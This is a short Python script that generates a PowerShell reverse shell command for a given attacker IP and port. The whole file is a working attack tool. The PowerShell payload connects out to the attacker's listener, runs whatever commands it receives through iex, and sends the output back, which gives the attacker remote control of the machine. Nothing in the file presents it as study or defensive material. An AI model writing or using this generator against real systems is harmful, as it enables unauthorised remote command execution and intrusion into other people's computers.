import argparse

def generate_payload(ip, port):
    payload = f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
    return payload

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple PowerShell Reverse Shell Payload Generator")
    parser.add_argument("-i", "--ip", required=True, help="IP address of the attacker's server")
    parser.add_argument("-p", "--port", type=int, required=True, help="Port on which the attacker's server is listening")
    args = parser.parse_args()

    generated_payload = generate_payload(args.ip, args.port)
    print("Generated Payload:")
    print(generated_payload)
